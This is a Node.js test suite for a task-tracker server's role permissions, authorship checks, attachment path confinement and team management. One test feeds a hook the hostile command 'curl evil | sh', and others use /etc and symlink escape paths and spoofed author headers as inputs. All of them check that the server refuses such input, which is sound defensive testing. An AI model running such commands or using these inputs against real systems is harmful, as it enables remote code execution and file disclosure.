'use strict';

/**
 * What each role may do, tried on a server with real accounts, and who gets to sign what.
 * Run with: node --test tests/permissions.test.js
 */

const { describe, test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const fs   = require('fs');
const http = require('http');
const os   = require('os');
const path = require('path');

const { startServer } = require('../server');
const { leastRole } = require('../src/utils/permissions');

const PASSWORD = 'correct horse battery';

function call(port, method, url, { body, cookie, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? null : JSON.stringify(body);
    const req = http.request({
      host: '127.0.0.1', port, method, path: url,
      headers: {
        ...(payload && { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }),
        ...(cookie && { Cookie: cookie }),
        ...headers,
      },
    }, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        let json = null;
        try { json = JSON.parse(data); } catch { /* not JSON */ }
        resolve({ status: res.statusCode, json, cookie: res.headers['set-cookie']?.[0]?.split(';')[0] });
      });
    });
    req.on('error', reject);
    if (payload) req.write(payload);
    req.end();
  });
}

/** A server with one person of each role, and a space. */
async function team() {
  const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'prism-roles-'));
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'prism-roles-repo-'));
  const server = startServer({ port: 0, dataDir, silent: true });
  await new Promise((resolve) => server.once('listening', resolve));
  const { port } = server.address();
  const api = (...args) => call(port, ...args);
  const setupCode = fs.readFileSync(path.join(dataDir, 'setup-code'), 'utf8').trim();
  const admin = await api('POST', '/api/v1/auth/setup', { body: { name: 'Ana López', email: 'ana@example.com', password: PASSWORD, setupCode } });
  const join = async (name, role) => {
    const invite = await api('POST', '/api/v1/invites', { cookie: admin.cookie, body: { email: `${name.toLowerCase()}@example.com`, role } });
    const res = await api('POST', `/api/v1/auth/links/${invite.json.path.split('/').pop()}`, { body: { name, password: PASSWORD } });
    return { cookie: res.cookie, id: res.json.user.id, name };
  };
  const member = await join('Bea', 'member');
  const viewer = await join('Carlos', 'viewer');
  const space = (await api('POST', '/api/v1/spaces', { cookie: admin.cookie, body: { name: 'Web', key: 'WEB', workingDirectory: repo } })).json;
  return {
    api, repo, space, dataDir, server,
    admin: { cookie: admin.cookie, id: admin.json.user.id, name: 'Ana López' },
    member, viewer,
    async close() {
      server.closeAllConnections();
      await new Promise((resolve) => server.close(resolve));
      server._store.close();
      fs.rmSync(dataDir, { recursive: true, force: true });
      fs.rmSync(repo, { recursive: true, force: true });
    },
  };
}

describe('every route, with every role', () => {
  let t;
  before(async () => { t = await team(); });
  after(() => t.close());

  const S = '/api/v1/spaces/x';
  const T = `${S}/tasks/y`;
  /** Everything the router and the accounts answer to, with the least role that may. */
  const ROUTES = [
    ['GET', '/api/v1/spaces', 'viewer'], ['POST', '/api/v1/spaces', 'admin'],
    ['GET', S, 'viewer'], ['PUT', S, 'admin'], ['DELETE', S, 'admin'],
    ['PUT', `${S}/statuses`, 'admin'], ['PUT', `${S}/hooks`, 'admin'],
    ['GET', `${S}/task-runs`, 'viewer'],
    ['GET', `${S}/tasks`, 'viewer'], ['POST', `${S}/tasks`, 'member'], ['DELETE', `${S}/tasks`, 'admin'],
    ['PATCH', `${S}/tasks/rank`, 'member'],
    ['GET', T, 'viewer'], ['PUT', T, 'member'], ['DELETE', T, 'member'],
    ['PUT', `${T}/move`, 'member'], ['PATCH', `${T}/rank`, 'member'], ['GET', `${T}/history`, 'viewer'],
    ['PUT', `${T}/attachments`, 'member'], ['PATCH', `${T}/attachments`, 'member'], ['GET', `${T}/attachments/0`, 'viewer'],
    ['POST', `${T}/comments`, 'member'], ['PATCH', `${T}/comments/z`, 'member'],
    ['POST', `${T}/run`, 'member'], ['POST', `${T}/request-changes`, 'member'], ['POST', `${T}/close`, 'member'], ['POST', `${T}/pr`, 'member'],
    ['GET', '/api/v1/runs/r/diff', 'member'], ['GET', '/api/v1/runs/r/log', 'member'],
    ['POST', '/api/v1/runs/r/stop', 'member'], ['POST', '/api/v1/runs/r/resume', 'member'],
    ['GET', '/api/v1/tasks', 'viewer'], ['POST', '/api/v1/tasks', 'member'], ['DELETE', '/api/v1/tasks', 'admin'],
    ['GET', '/api/v1/tasks/y', 'viewer'], ['PUT', '/api/v1/tasks/y/move', 'member'],
    ['GET', '/api/v1/tasks/search?q=a', 'viewer'], ['GET', '/api/v1/issues/WEB-1', 'viewer'], ['GET', '/api/v1/harnesses', 'viewer'],
    ['POST', '/api/v1/fs/validate', 'admin'],
    ['GET', '/api/v1/users', 'viewer'], ['PATCH', '/api/v1/users/u', 'admin'], ['POST', '/api/v1/users/u/reset-link', 'admin'],
    ['GET', '/api/v1/invites', 'admin'], ['POST', '/api/v1/invites', 'admin'], ['DELETE', '/api/v1/invites/i', 'admin'],
    // Not a route. A write nobody opened stays closed.
    ['POST', '/api/v1/something-new', 'admin'], ['PUT', `${T}/something-new`, 'admin'],
  ];
  const RANK = { viewer: 0, member: 1, admin: 2 };

  for (const [method, url, least] of ROUTES) {
    for (const role of ['viewer', 'member', 'admin']) {
      const allowed = RANK[role] >= RANK[least];
      test(`${method} ${url} ${allowed ? 'lets in' : 'stops'} a ${role}`, async () => {
        const res = await t.api(method, url, { cookie: t[role].cookie, body: method === 'GET' ? undefined : {} });
        if (allowed) assert.ok(![401, 403].includes(res.status), `got ${res.status}: ${JSON.stringify(res.json)}`);
        else assert.equal(res.status, 403);
      });
    }
  }

  test('the table agrees with the rules, for the forms of a path a key can take', () => {
    assert.equal(leastRole('DELETE', '/api/v1/spaces/x/tasks/WEB-1'), 'member');
    assert.equal(leastRole('PUT', '/api/v1/tasks/WEB-1/move'), 'member');
    assert.equal(leastRole('DELETE', '/api/v1/tasks'), 'admin');
    assert.equal(leastRole('HEAD', '/api/v1/spaces'), 'viewer');
  });
});

describe('what a role does for real', () => {
  let t, url;
  before(async () => {
    t = await team();
    url = `/api/v1/spaces/${t.space.id}/tasks`;
  });
  after(() => t.close());

  const create = (who, body = {}) => t.api('POST', url, { cookie: who.cookie, body: { title: 'An issue', type: 'chore', ...body } });

  test('a viewer reads it all and changes nothing', async () => {
    const issue = (await create(t.member)).json;
    assert.equal((await t.api('GET', url, { cookie: t.viewer.cookie })).status, 200);
    assert.equal((await t.api('GET', `${url}/${issue.id}/history`, { cookie: t.viewer.cookie })).status, 200);
    assert.equal((await t.api('PUT', `${url}/${issue.id}`, { cookie: t.viewer.cookie, body: { title: 'Hacked' } })).status, 403);
    assert.equal((await t.api('POST', `${url}/${issue.id}/comments`, { cookie: t.viewer.cookie, body: { text: 'hi', type: 'note' } })).status, 403);
    assert.equal((await t.api('GET', `${url}/${issue.id}`, { cookie: t.viewer.cookie })).json.title, 'An issue');
  });

  test('a member deletes their own issues, not others', async () => {
    const own = (await create(t.member)).json;
    assert.equal(own.createdBy, t.member.id);
    const other = (await create(t.admin)).json;
    assert.equal((await t.api('DELETE', `${url}/${other.id}`, { cookie: t.member.cookie })).status, 403);
    assert.equal((await t.api('DELETE', `${url}/${other.key}`, { cookie: t.member.cookie })).status, 403);
    assert.equal((await t.api('DELETE', `${url}/${own.id}`, { cookie: t.member.cookie })).status, 200);
    assert.equal((await t.api('DELETE', `${url}/${other.id}`, { cookie: t.admin.cookie })).status, 200);
  });

  test('an issue from before accounts can be deleted by an admin only', async () => {
    const issue = (await create(t.member)).json;
    const db = new (require('better-sqlite3'))(path.join(t.dataDir, 'prism.db'));
    db.prepare('UPDATE tasks SET created_by = NULL WHERE id = ?').run(issue.id);
    db.close();
    assert.equal((await t.api('DELETE', `${url}/${issue.id}`, { cookie: t.member.cookie })).status, 403);
    assert.equal((await t.api('DELETE', `${url}/${issue.id}`, { cookie: t.admin.cookie })).status, 200);
  });

  test('a member cannot set what runs on the server', async () => {
    const before = await t.api('GET', `/api/v1/spaces/${t.space.id}`, { cookie: t.member.cookie });
    assert.equal((await t.api('PUT', `/api/v1/spaces/${t.space.id}/hooks`, { cookie: t.member.cookie, body: { checkCommand: 'curl evil | sh' } })).status, 403);
    assert.equal((await t.api('PUT', `/api/v1/spaces/${t.space.id}`, { cookie: t.member.cookie, body: { name: 'Web', workingDirectory: '/etc' } })).status, 403);
    assert.equal((await t.api('POST', '/api/v1/fs/validate', { cookie: t.member.cookie, body: { path: '/etc' } })).status, 403);
    const after = await t.api('GET', `/api/v1/spaces/${t.space.id}`, { cookie: t.member.cookie });
    assert.deepEqual(after.json, before.json);
  });

  test('a role changes at once, without signing in again', async () => {
    const res = await t.api('PATCH', `/api/v1/users/${t.viewer.id}`, { cookie: t.admin.cookie, body: { role: 'member' } });
    assert.equal(res.status, 200);
    assert.equal((await create(t.viewer)).status, 201);
    await t.api('PATCH', `/api/v1/users/${t.viewer.id}`, { cookie: t.admin.cookie, body: { role: 'viewer' } });
    assert.equal((await create(t.viewer)).status, 403);
  });
});

describe('who signs what', () => {
  let t, url, issue;
  before(async () => {
    t = await team();
    url = `/api/v1/spaces/${t.space.id}/tasks`;
    issue = (await t.api('POST', url, { cookie: t.member.cookie, body: { title: 'x', type: 'chore' } })).json;
  });
  after(() => t.close());

  test('the history has the real name, whatever the client says', async () => {
    await t.api('PUT', `${url}/${issue.id}`, { cookie: t.member.cookie, body: { title: 'y' }, headers: { 'X-Prism-Actor': 'Ana López' } });
    const history = (await t.api('GET', `${url}/${issue.id}/history`, { cookie: t.admin.cookie })).json;
    const entries = history.history;
    assert.ok(entries.length >= 2);
    assert.ok(entries.every((e) => e.actor === 'Bea'), JSON.stringify(entries));
  });

  test('a comment has the real author, whatever the body says', async () => {
    const res = await t.api('POST', `${url}/${issue.id}/comments`, { cookie: t.member.cookie, body: { author: 'Ana López', text: 'Approved', type: 'note' } });
    assert.equal(res.status, 201);
    assert.equal(res.json.author, 'Bea');
    const noAuthor = await t.api('POST', `${url}/${issue.id}/comments`, { cookie: t.member.cookie, body: { text: 'No author sent', type: 'note' } });
    assert.equal(noAuthor.status, 201);
  });

  test('only its author or an admin changes the words of a comment; anyone who writes can resolve', async () => {
    const q = (await t.api('POST', `${url}/${issue.id}/comments`, { cookie: t.member.cookie, body: { text: 'Which one?', type: 'question' } })).json;
    const other = t.admin;
    const c = `${url}/${issue.id}/comments/${q.id}`;
    const stranger = await (async () => {
      const invite = await t.api('POST', '/api/v1/invites', { cookie: t.admin.cookie, body: { email: 'dani@example.com', role: 'member' } });
      return (await t.api('POST', `/api/v1/auth/links/${invite.json.path.split('/').pop()}`, { body: { name: 'Dani', password: PASSWORD } })).cookie;
    })();
    assert.equal((await t.api('PATCH', c, { cookie: stranger, body: { text: 'Forged words' } })).status, 403);
    assert.equal((await t.api('PATCH', c, { cookie: stranger, body: { type: 'note' } })).status, 403);
    assert.equal((await t.api('PATCH', c, { cookie: stranger, body: { resolved: true } })).status, 200);
    assert.equal((await t.api('PATCH', c, { cookie: t.member.cookie, body: { text: 'Better words' } })).status, 200);
    assert.equal((await t.api('PATCH', c, { cookie: other.cookie, body: { text: 'Moderated' } })).status, 200);
    const seen = (await t.api('GET', `${url}/${issue.id}`, { cookie: t.member.cookie })).json.comments.find((x) => x.id === q.id);
    assert.equal(seen.authorId, t.member.id);
  });
});

describe('attachments cannot read the server', () => {
  let t, url;
  before(async () => {
    t = await team();
    url = `/api/v1/spaces/${t.space.id}/tasks`;
    fs.writeFileSync(path.join(t.repo, 'notes.md'), 'In the repo');
    fs.symlinkSync('/etc/hostname', path.join(t.repo, 'sneaky'));
  });
  after(() => t.close());

  const read = async (content, who = t.admin) => {
    const res = await t.api('POST', url, { cookie: who.cookie, body: { title: 'x', type: 'chore', attachments: [{ name: 'f', type: 'file', content }] } });
    assert.equal(res.status, 201, JSON.stringify(res.json));
    return t.api('GET', `${url}/${res.json.id}/attachments/0`, { cookie: who.cookie });
  };

  test('a file in the repository folder is fine', async () => {
    const res = await read(path.join(t.repo, 'notes.md'), t.member);
    assert.equal(res.status, 200);
    assert.equal(res.json.content, 'In the repo');
    assert.equal(res.json.source, path.join(t.repo, 'notes.md'));
  });

  test('a missing file in it is reported as missing', async () => {
    const res = await read(path.join(t.repo, 'gone.md'));
    assert.equal(res.status, 422);
    assert.equal(res.json.error.code, 'FILE_NOT_FOUND');
  });

  test('anywhere else is refused, for everyone, admins too, and does not tell what exists', async () => {
    assert.equal((await read('/nonexistent/secret')).status, 403);
    for (const who of [t.member, t.admin]) {
      assert.equal((await read('/etc/hostname', who)).status, 403);
      assert.equal((await read(path.join(t.dataDir, 'prism.db'), who)).status, 403);
    }
  });

  test('a link inside the folder that points out is refused', async () => {
    assert.equal((await read(path.join(t.repo, 'sneaky'))).status, 403);
  });

  test('a folder with a similar name does not count', async () => {
    const sibling = `${t.repo}-evil`;
    fs.mkdirSync(sibling);
    fs.writeFileSync(path.join(sibling, 'x'), 'secret');
    try {
      assert.equal((await read(path.join(sibling, 'x'))).status, 403);
    } finally {
      fs.rmSync(sibling, { recursive: true, force: true });
    }
  });

  test('a space with no folder reads no files', async () => {
    const res = await t.api('POST', '/api/v1/tasks', { cookie: t.admin.cookie, body: { title: 'x', type: 'chore', attachments: [{ name: 'f', type: 'file', content: '/etc/hostname' }] } });
    assert.equal((await t.api('GET', `/api/v1/tasks/${res.json.id}/attachments/0`, { cookie: t.admin.cookie })).status, 403);
  });
});

describe('managing the team', () => {
  let t;
  before(async () => { t = await team(); });
  after(() => t.close());

  const patch = (id, body, who = t.admin) => t.api('PATCH', `/api/v1/users/${id}`, { cookie: who.cookie, body });

  test('bad changes are refused', async () => {
    assert.equal((await patch(t.member.id, { role: 'owner' })).status, 400);
    assert.equal((await patch(t.member.id, { active: 'no' })).status, 400);
    assert.equal((await patch(t.member.id, {})).status, 400);
    assert.equal((await patch('nobody', { role: 'member' })).status, 404);
  });

  test('there is always an admin left', async () => {
    assert.equal((await patch(t.admin.id, { role: 'member' })).status, 409);
    assert.equal((await patch(t.admin.id, { active: false })).status, 409);
    assert.equal((await patch(t.member.id, { role: 'admin' })).status, 200);
    assert.equal((await patch(t.admin.id, { role: 'member' })).status, 200);
    assert.equal((await patch(t.member.id, { role: 'member' }, t.member)).status, 409);
    assert.equal((await patch(t.admin.id, { role: 'admin' }, t.member)).status, 200);
    assert.equal((await patch(t.member.id, { role: 'member' })).status, 200);
  });

  test('two admins demoting each other at once leave one', async () => {
    await patch(t.member.id, { role: 'admin' });
    const results = await Promise.all([patch(t.admin.id, { role: 'member' }, t.member), patch(t.member.id, { role: 'member' }, t.admin)]);
    const users = (await t.api('GET', '/api/v1/users', { cookie: t.viewer.cookie })).json;
    assert.ok(users.filter((u) => u.role === 'admin' && u.active).length >= 1, JSON.stringify(results.map((r) => r.status)));
    // Back as they were, whoever is the admin now.
    const admin = users.find((u) => u.role === 'admin').id === t.admin.id ? t.admin : t.member;
    await patch(t.admin.id, { role: 'admin' }, admin);
    await patch(t.member.id, { role: 'member' }, t.admin);
  });

  test('turning an account off ends everything, and back on revives nothing', async () => {
    const resetLink = (await t.api('POST', `/api/v1/users/${t.viewer.id}/reset-link`, { cookie: t.admin.cookie })).json.path.split('/').pop();
    assert.equal((await patch(t.viewer.id, { active: false })).json.active, false);
    assert.equal((await t.api('GET', '/api/v1/spaces', { cookie: t.viewer.cookie })).status, 401);
    assert.equal((await t.api('POST', '/api/v1/auth/login', { body: { email: 'carlos@example.com', password: PASSWORD } })).status, 401);
    assert.equal((await t.api('GET', `/api/v1/auth/links/${resetLink}`)).status, 404);
    assert.equal((await t.api('POST', `/api/v1/users/${t.viewer.id}/reset-link`, { cookie: t.admin.cookie })).status, 404);

    assert.equal((await patch(t.viewer.id, { active: true })).json.active, true);
    assert.equal((await t.api('GET', '/api/v1/spaces', { cookie: t.viewer.cookie })).status, 401);
    assert.equal((await t.api('GET', `/api/v1/auth/links/${resetLink}`)).status, 404);
    assert.equal((await t.api('POST', '/api/v1/auth/login', { body: { email: 'carlos@example.com', password: PASSWORD } })).status, 200);
  });

  test('a sign-in under way does not outlive being turned off', async () => {
    const logins = Array.from({ length: 4 }, () => t.server._store.accounts.signIn('bea@example.com', PASSWORD).catch(() => null));
    await patch(t.member.id, { active: false });
    const results = await Promise.all(logins);
    assert.equal(results.filter(Boolean).filter((r) => t.server._store.accounts.sessionFor(r.token)).length, 0);
    await patch(t.member.id, { active: true });
  });
});
